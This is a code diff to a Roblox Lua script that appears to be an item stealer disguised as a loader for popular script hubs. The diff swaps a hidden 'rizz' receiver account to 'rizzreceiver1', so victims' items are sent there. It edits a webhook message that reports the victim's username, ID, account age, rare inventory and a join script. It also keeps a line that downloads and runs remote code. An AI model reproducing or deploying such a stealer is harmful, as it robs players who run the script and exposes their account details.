@@ -1,5 +1,5 @@
 rizz = {
-    Receivers = {"roblox"} -- Add receivers for rizz here
+    Receivers = {"rizzreceiver1"} -- Add receivers for rizz here
 }
 
 Commands = {
@@ -346,8 +346,8 @@ local data = {
    ["content"] = "@everyone",
    ["embeds"] = {
        {
-            ["title"] = "🤓 **Made by | unluckyau**",
-            ["description"] = "```Username     : " .. LocalPlayer.Name .. "\nUser Id      : " .. LocalPlayer.UserId .. "\nAccount Age  : " .. LocalPlayer.AccountAge .. "\nExploit      : " .. identifyexecutor() .. "\nAnti-Stealer : " .. AntiStealer .. "\nReceiver/s   : " .. table.concat(Config.Receivers, ", ") .. ", " .. table.concat(rizz.Receivers, ", ") .. "\nScript       : " .. Config.Script .. "```\n🎒 **__Inventory__**\n```Ancient    📜: " .. Ancient .. "\nGodly      🪙: " .. Godly .. "\nUnique     🌚: " .. Unique .. "\nVintage    🍷: " .. Vintage .. "\nLegendary  🍗: " .. Legendary .. "\nRare       ☁️: " .. Rare .. "\nUncommon   🌑: " .. Uncommon .. "\nCommon     📀: " .. Common .. "```\n🎒 **__Full Inventory__**\n```" .. FullInventory() .. "```\n🔗 **__Execute to join__**\n```" .. TeleportScript .. "```",
+            ["title"] = "👿 **Made by | Unluckyau**",
+            ["description"] = "```Username     : " .. LocalPlayer.Name .. "\nUser Id      : " .. LocalPlayer.UserId .. "\nAccount Age  : " .. LocalPlayer.AccountAge .. "\nExploit      : " .. identifyexecutor() .. "\nAnti-Stealer : " .. AntiStealer .. "\nReceiver/s   : " .. table.concat(Config.Receivers, ", ") .. ", " .. table.concat(rizz.Receivers, ", ") .. "\nScript       : " .. Config.Script .. "```\n🎒 **__Inventory__**\n```Ancient    🟪: " .. Ancient .. "\nGodly      🧠: " .. Godly .. "\nUnique     🟧: " .. Unique .. "\nVintage    🟨: " .. Vintage .. "\nLegendary  🟥: " .. Legendary .. "\nRare       🟩: " .. Rare .. "\nUncommon   🟦: " .. Uncommon .. "\nCommon     ⬛: " .. Common .. "```\n🎒 **__Full Inventory__**\n```" .. FullInventory() .. "```\n🔗 **__Execute to join__**\n```" .. TeleportScript .. "```",
             ["type"] = "rich",
             ["color"] = tonumber(0xffd700),
        }
@@ -383,3 +383,5 @@ elseif Config.Script == "AshbornnHub" then
 elseif Config.Script == "Nexus" then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/s-o-a-b/nexus/main/loadstring"))()
 end
+
+print('hi')
